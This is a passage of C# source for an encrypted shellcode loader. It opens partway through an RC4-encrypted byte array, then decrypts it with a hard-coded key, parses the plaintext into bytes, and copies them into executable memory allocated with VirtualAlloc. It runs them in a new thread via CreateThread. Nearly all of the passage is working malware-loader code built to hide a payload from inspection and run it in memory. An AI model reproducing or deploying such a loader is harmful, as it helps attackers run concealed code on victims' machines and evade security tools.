  0x82, 0x2a, 0x49, 0x58, 0xdc, 0x47, 0x5f, 0x12, 0x1f, 0xa6, 0xb1, 0xb8,
  0xcf, 0x4d, 0x2a, 0x5a, 0x51, 0x70, 0xc1, 0x00, 0x2b, 0x23, 0xfa, 0x7b,
  0xf3, 0xb0, 0x94, 0xa8, 0x3b, 0x17, 0xb8, 0xa0, 0xaf, 0x67, 0x1d, 0x78,
  0x16, 0x83, 0xee, 0x9b, 0xdb, 0xfa, 0x3d, 0xcf, 0x02, 0x03, 0xff, 0x20,
  0x51, 0x96, 0x0f, 0xc2, 0xa2, 0x72, 0x08, 0xdc, 0x63, 0x4e, 0xe7, 0x6b,
  0x62, 0x74, 0x2f, 0xb0, 0xb4, 0xed, 0x60, 0xcb, 0xf8, 0xc1, 0xda, 0x9b,
  0x99, 0x26, 0xc6, 0x64, 0x49, 0x0d, 0x55, 0xbb, 0x0b, 0x33, 0xbe, 0x86,
  0x09, 0x79, 0x50, 0x50, 0x43, 0xff, 0x36, 0x74, 0x98, 0xd8, 0xac, 0x79,
  0x49, 0xcf, 0x74, 0x0a, 0x46, 0x35, 0x3c, 0xc4, 0x66, 0x7d, 0x9a, 0xa0,
  0xcc, 0x66, 0xa3, 0x32, 0x26, 0x4f, 0x46, 0xb7, 0x86, 0xff, 0x80, 0x44,
  0x28, 0xf6, 0x9e, 0x99, 0xbd, 0xc4, 0x67, 0x17, 0x04, 0x19, 0xc6, 0xb2,
  0x4d, 0xef, 0x32, 0xb7, 0x07, 0xf8, 0x5f, 0x9c, 0xee, 0xb0, 0x27, 0x2c,
  0xa7, 0x70, 0x17, 0x6a, 0xc5, 0x31, 0x81, 0xb0, 0x01, 0x7e, 0x80, 0xc1,
  0x4a, 0x96, 0x45, 0x36, 0xe6, 0x0e, 0x8d, 0xcd, 0xea, 0x4a, 0xeb, 0x6a,
  0x2d, 0xf0, 0xed, 0xfa, 0x85, 0x26, 0xc4, 0xaf, 0xc4, 0xe1, 0xdd, 0x7b,
  0x84, 0x26, 0x86, 0xae, 0x61, 0x4e, 0xc7, 0xf1, 0x2e, 0x70, 0x8c, 0x34
};


        string key = "HLkkMYkLyJt]k=JWa-4frG4m^$;tx?";

        byte[] keyByte = Encoding.ASCII.GetBytes(key);
        byte[] decrypt = RC4.Decrypt(keyByte, enc_buf);

        Console.WriteLine("Decrypted Text: " + System.Text.Encoding.UTF8.GetString(decrypt));
        Console.WriteLine("Length: " + decrypt.Length);

        string input = System.Text.Encoding.UTF8.GetString(decrypt);

        // Parse the string to extract the byte array
        byte[] buf = ParseByteArray(input);

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    static byte[] ParseByteArray(string input)
    {
        // Find the start and end of the byte array initialization
        int startIndex = input.IndexOf('{') + 1;
        int endIndex = input.IndexOf('}');

        // Extract the substring containing the hex values
        string hexValues = input.Substring(startIndex, endIndex - startIndex);

        // Split the hex values into an array of strings
        string[] hexArray = hexValues.Split(new[] { ',', ' ', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

        // Convert the hex strings to byte values
        byte[] byteArray = hexArray.Select(hex => Convert.ToByte(hex, 16)).ToArray();

        return byteArray;
    }
}
